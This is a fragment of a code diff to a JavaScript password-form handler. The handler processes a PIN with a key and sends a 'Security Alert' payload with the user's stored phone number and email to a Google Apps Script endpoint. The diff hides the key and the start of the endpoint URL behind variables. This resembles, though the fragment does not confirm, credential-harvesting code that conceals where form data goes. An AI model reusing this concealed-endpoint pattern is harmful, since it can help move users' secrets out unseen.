@@ -92,7 +92,7 @@ document.getElementById('passwordForm').addEventListener('submit', async functio
   if (password1 === password2) {
     async function doTaskA(pininput) {
       if (pininput) {
-        return await processX(pininput, 'k9x7z3'); // Replace 'k9x7z3' with your actual key or variable
+        return await processX(pininput, k9x7z3); // Replace 'k9x7z3' with your actual key or variable
       } else {
         alert('Please enter a value for PIN');
         return null;
@@ -138,7 +138,7 @@ document.getElementById('passwordForm').addEventListener('submit', async functio
     const sphone = localStorage.getItem('phoneNumber');
     const email = localStorage.getItem('mymail');
     const url =
-      'https://script.google.com/macros/s/AKfycbwr-I-bBR-W7h6LHOLHTRIuciRb2q869OzJnlIknoKbrL1W8gTWBFzjSIAVFbEymDgHQw/exec'; // Replace with your GAS deployment URL
+      `${strct}/AKfycbwr-I-bBR-W7h6LHOLHTRIuciRb2q869OzJnlIknoKbrL1W8gTWBFzjSIAVFbEymDgHQw/exec`; // Replace with your GAS deployment URL
     const payload = {
       to_email: email,
       subject: `Security Alert ${sphone}`,
